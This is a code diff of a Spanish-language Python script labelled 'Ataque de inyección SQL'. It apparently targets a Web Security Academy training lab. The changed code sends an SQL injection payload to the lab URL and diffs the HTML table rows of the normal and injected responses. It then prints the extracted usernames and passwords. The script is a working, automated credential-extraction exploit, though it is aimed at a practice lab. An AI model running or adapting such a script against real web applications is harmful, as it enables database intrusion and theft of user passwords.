@@ -111,7 +111,7 @@ def consultar_columnas(params):
     
     url, path, lista_tablas, id_tabla, lista_columnas = params['url'], params['path'], params['lista_tablas'], params['id_tabla'], params['lista_columnas']
     
-    print("Ingrese las columnas a consultar")
+    print("\nIngrese las columnas a consultar")
     
     print("Columna 1: ", end="")
     columna_1 = int(input())
@@ -129,19 +129,27 @@ def consultar_columnas(params):
     respuesta_normal = requests.get(url + path[1:])
     respuesta_vulnerada = requests.get(url + path[1:] + sql_payload)
     
-    print(respuesta_normal.text)
-    print(respuesta_vulnerada.text)
+    lista_tr_vulnerada = BeautifulSoup(respuesta_vulnerada.text, 'html.parser').find_all('tr')
+    lista_tr_normal = BeautifulSoup(respuesta_normal.text, 'html.parser').find_all('tr')
     
-    # lista_th_vulnerada = BeautifulSoup(respuesta_vulnerada.text, 'html.parser').find_all('th')
-    # lista_th_normal = BeautifulSoup(respuesta_normal.text, 'html.parser').find_all('th')
+    lista_diferencias = []
+    print()
+    for elemento in lista_tr_vulnerada:
+        if elemento not in lista_tr_normal:
+            lista_diferencias.append(elemento)
     
-    
+    for elemento in lista_diferencias:
+        usuario = elemento.find_all('th')[0].get_text()
+        contrasena = elemento.find_all('td')[0].get_text()
+        
+        print("Usuario: " + usuario + ", Contraseña: " + contrasena)
+        
     
     
 def main():
     params = {}
     
-    params['url'] = "https://0a1700bf03dfc79f80db35a7009300d5.web-security-academy.net/"
+    params['url'] = "https://0a72002a0418ac0180c8b206002a0081.web-security-academy.net/"
     
     print("\nAtaque de inyección SQL")
     # determinar numero de columnas
